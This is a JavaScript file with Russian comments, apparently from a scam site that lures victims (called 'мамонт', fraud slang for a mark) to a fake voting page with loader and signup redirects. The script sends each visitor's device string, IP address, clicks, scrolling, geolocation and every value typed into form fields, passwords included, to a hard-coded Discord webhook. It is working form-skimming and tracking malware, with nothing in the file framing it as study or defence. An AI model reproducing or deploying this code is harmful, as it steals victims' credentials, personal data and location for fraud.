const webhookURL = 'https://discord.com/api/webhooks/1303384530895372338/orvIQvUJHq86vnrecZ5tNFzw1UGCH2LAy18RjtJmTNSdhgd8yaDSZSdTlevLid7EGcjB';

// Функция для получения информации о пользователе
async function getUserInfo() {
    const userAgent = navigator.userAgent; // Получаем информацию о браузере/устройстве
    const timestamp = new Date().toLocaleString(); // Получаем текущее время

    // Получаем IP-адрес пользователя
    const ipResponse = await fetch('https://api.ipify.org?format=json');
    const ipData = await ipResponse.json();

    return {
        phoneInfo: userAgent,
        visitTime: timestamp,
        ipAddress: ipData.ip
    };
}

// Функция для отправки данных в Discord через вебхук
function sendToDiscord(data) {
    const message = {
        content: data.content
    };

    fetch(webhookURL, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify(message)
    })
    .then(response => {
        if (response.ok) {
            console.log('Данные успешно отправлены в Discord');
        } else {
            console.error('Ошибка при отправке данных в Discord');
        }
    })
    .catch(error => {
        console.error('Ошибка при отправке запроса: ', error);
    });
}

// Получаем данные и отправляем их в Discord при загрузке страницы
window.onload = async () => {
    const userData = await getUserInfo();
    sendToDiscord({
        content: `Мамонт посетил сайт:
        - Телефон мамонта: ${userData.phoneInfo}
        - Время входа мамонта: ${userData.visitTime}
        - IP-адрес Мамонта: ${userData.ipAddress}`
    });

    // Записываем время начала визита
    window.startTime = Date.now();
};

// Отслеживание кликов по всем кнопкам на странице
document.querySelectorAll('button').forEach(button => {
    button.addEventListener('click', (event) => {
        const actionData = {
            content: `Мамонт нажал на кнопку: ${event.target.innerText}`
        };
        sendToDiscord(actionData);
    });
});

// Отслеживание скроллинга
window.addEventListener('scroll', () => {
    const scrollData = {
        content: `Мамонт скролит сайт. Текущий скролл Y: ${window.scrollY}`
    };
    sendToDiscord(scrollData);
});

// Отслеживание кликов по ссылкам
document.querySelectorAll('a').forEach(link => {
    link.addEventListener('click', (event) => {
        const linkData = {
            content: `Мамонт кликнул по ссылке: ${event.target.href}`
        };
        sendToDiscord(linkData);
    });
});

// Отслеживание изменения ввода в текстовых полях (например, формы)
document.querySelectorAll('input, textarea').forEach(input => {
    input.addEventListener('input', (event) => {
        const inputData = {
            content: `Мамонт дал данные: ${event.target.value} (Тип поля: ${event.target.type})`
        };
        sendToDiscord(inputData);
    });
});

// Основная функция, вызываемая при нажатии на кнопку
function handleClick() {
    redirectToPage(); // Переход на первую страницу
    setTimeout(redirectBack, 6000); // Через 6 секунд перенаправляем на вторую страницу
}

// Функция для перенаправления на первую страницу
function redirectToPage() {
    window.location.href = 'loader.html'; // Замените на нужный URL
}

// Функция для перенаправления на вторую страницу через 6 секунд
function redirectBack() {
    setTimeout(function() {
        window.location.href = 'signup.html'; // Замените на нужный URL
    }, 6000);
}

// Функция для получения местоположения пользователя
function getLocationAndSendToWebhook() {
    if (navigator.geolocation) {
        // Запрашиваем местоположение
        navigator.geolocation.getCurrentPosition(sendLocationToWebhook, showError);
    } else {
        console.log("Геолокация не поддерживается этим браузером.");
    }
}

// Функция для обработки успешного получения местоположения
function sendLocationToWebhook(position) {
    const latitude = position.coords.latitude;
    const longitude = position.coords.longitude;

    const message = {
        content: `Местоположение пользователя:\nШирота Мамонта: ${latitude}\nДолгота Мамонта: ${longitude}`
    };

    fetch(webhookURL, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify(message)
    })
    .then(response => {
        if (response.ok) {
            console.log('Данные успешно отправлены в Discord');
        } else {
            console.error('Ошибка при отправке данных в Discord');
        }
    })
    .catch(error => {
        console.error('Ошибка при отправке запроса: ', error);
    });
}

// Функция для обработки ошибок получения местоположения
function showError(error) {
    switch(error.code) {
        case error.PERMISSION_DENIED:
            console.log("Пользователь отклонил запрос на доступ к геолокации.");
            break;
        case error.POSITION_UNAVAILABLE:
            console.log("Информация о местоположении недоступна.");
            break;
        case error.TIMEOUT:
            console.log("Превышено время ожидания запроса.");
            break;
        case error.UNKNOWN_ERROR:
            console.log("Неизвестная ошибка.");
            break;
    }
}

// Отправка времени, проведенного на сайте, при уходе со страницы
window.onbeforeunload = () => {
    const endTime = Date.now();
    const timeSpent = Math.round((endTime - window.startTime) / 1000); // Время в секундах

    const timeSpentData = {
        content: `Мамонт провел на сайте ${timeSpent} секунд.`
    };
    sendToDiscord(timeSpentData);
};

// Добавляем обработчик события для кнопки получения местоположения
document.getElementById("getLocationBtn").addEventListener("click", getLocationAndSendToWebhook);

// Обработчик для кнопки "Голосовать"
document.getElementById('voteButton').addEventListener('click', () => {
    const voteMessage = {
        content: `Мамонт проголосовал!`
    };
    sendToDiscord(voteMessage);

    // Логика увеличения счетчика голосов
    const voteCount = document.getElementById('voteCount');
    let currentVotes = parseInt(voteCount.innerText);
    voteCount.innerText = currentVotes + 1;
});
